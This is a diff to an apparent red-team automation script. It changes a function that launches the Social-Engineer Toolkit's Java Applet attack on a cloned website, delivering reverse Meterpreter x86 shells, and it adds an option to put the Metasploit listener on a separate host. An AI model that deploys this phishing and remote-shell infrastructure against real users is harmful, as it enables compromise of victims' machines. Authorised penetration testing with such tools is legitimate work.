@@ -20,15 +20,21 @@ __email__ = 'david.bressler@guidepointsecurity.com'
 __status__ = 'Development'
 
 
-def java_applet(idic, user, sshkey):
+def java_applet(idic, user, sshkey, idic2=None):
 
     # Parse the config file and unpack user options from autoset menu
     config = src.core.config.get_config()
 
     web_clone = menus.autoset_file_menu()
-    print green("\nCreating custom SET automation file...")
-    autofile = autoset.java_applet(idic["ip"], web_clone)
-    print green("Custom SET automation file created.\n")
+
+    if idic2 is not None:
+        print green("\nCreating custom SET automation file...")
+        autofile = autoset.java_applet(idic["ip"], web_clone, idic2["ip"])
+        print green("Custom SET automation file created.\n")
+    elif idic2 is None:
+        print green("\nCreating custom SET automation file...")
+        autofile = autoset.java_applet(idic["ip"], web_clone)
+        print green("Custom SET automation file created.\n")
 
     while True:
         try:
@@ -79,7 +85,7 @@ def java_applet(idic, user, sshkey):
         set_auto(idic["ip"], user, autofile, sshkey)
         print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
 
-    elif interactive is True:
+    elif interactive is True and idic2 is None:
 
         print green("\nLaunching SET...")
         screen = set_auto(idic["ip"], user, autofile, sshkey)
@@ -100,3 +106,26 @@ def java_applet(idic, user, sshkey):
             print red("\nDropping into a SSH session....\n")
             print red("No screen session returned.")
             fabfunky.interactive_shell(idic["ip"], user, cmd, sshkey)
+
+    elif interactive is True and idic2 is not None:
+
+        print green("\nLaunching SET...")
+        set_auto(idic["ip"], user, autofile, sshkey)
+        print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
+
+        screen = fabfunky.metalistener(idic2["ip"], user, sshkey)
+        screen = screen.strip().split()
+        sleep(2)
+        if '.METALISTEN' in screen[5]:
+            print screen[5]
+            cmd = 'sudo screen -r %s' % screen[5]
+            print red("\nDropping into a SSH session....")
+            print green("SET Launched Java Applet at http://%s and metasploit listener is listening at %s") % (idic["ip"], idic2["ip"])
+            print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
+            sleep(2)
+            fabfunky.interactive_shell(idic2["ip"], user, cmd, sshkey)
+        else:
+            cmd = None
+            print red("\nDropping into a SSH session....\n")
+            print red("No screen session returned.")
+            fabfunky.interactive_shell(idic2["ip"], user, cmd, sshkey)
